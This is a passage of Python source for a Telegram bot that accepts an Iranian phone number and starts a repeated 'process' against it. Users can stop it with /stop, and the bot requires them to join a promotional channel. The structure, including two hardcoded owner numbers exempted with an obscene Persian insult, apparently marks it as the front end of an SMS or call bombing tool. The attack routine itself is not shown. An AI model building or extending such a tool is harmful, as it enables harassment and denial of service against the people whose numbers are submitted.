        members[msg.from_user.id] = True
        if num == "09051461773" or num == "09918864278":
            bot.send_message(msg.chat.id,"""بیا کیرمو بخور""")
            return
        
        script(num,5,msg)
    elif str(msg.text).startswith("+98"):
        num = str(msg.text).replace("+98","0")
        members[msg.from_user.id] = True
        limit_time_data[msg.from_user.id] = int(time())
        bot.send_message(msg.chat.id,"Phone number received. Process is starting..")
        if num == "09051461773" or num == "09918864278":
            bot.send_message(msg.chat.id,"""بیا کیرمو بخور""")
            return        
        script(num,5,msg)
    else :
        members[msg.from_user.id] = False
        bot.send_message(msg.chat.id,parse_mode="MarkDown",text="""
❌ *Invalid Phone Number Format!*

Please check your input and try again. Send /start to restart the process and submit your number in the correct format: _09xxxxxxxxx (e.g., 09123456789)_.
""")

@bot.message_handler(commands=['stop'])
def stop_func(msg):
    if is_user_member(msg.from_user.id):
        if members[msg.from_user.id]:
            bot.reply_to(msg,"Stoping the process...")
            members[msg.from_user.id]=False
            sleep(2)
            bot.send_message(msg.chat.id,"""Process stoped,
Thanks you for useing this bot.
[Channel : @sayeber](https://t.me/sayeber)""",parse_mode="MarkDown")
        else:
            bot.reply_to(msg,"☹️ No active processes found")
    else:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=f"https://t.me/{id_ch.replace('@', '')}"))
        markup.add(InlineKeyboardButton("✅ بررسی عضویت", callback_data="verify_join"))

        bot.send_message(
            msg.chat.id,
            "⚠️ جهت استفاده از ربات ابتدا در کانال زیر عضو شوید:",
            reply_markup=markup
        )


@bot.message_handler(func=lambda msg:True and limit_time(msg))
def sendmsg(msg):
    if is_user_member(msg.from_user.id):
        bot.send_message(msg.chat.id,"""⚠️ Unrecognized Command
To use this bot, please send /start and follow the instructions provided.
    """)
    else:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=f"https://t.me/{id_ch.replace('@', '')}"))
        markup.add(InlineKeyboardButton("✅ بررسی عضویت", callback_data="verify_join"))

        bot.send_message(
            msg.chat.id,
            "⚠️ جهت استفاده از ربات ابتدا در کانال زیر عضو شوید:",
            reply_markup=markup
        )
bot.infinity_polling()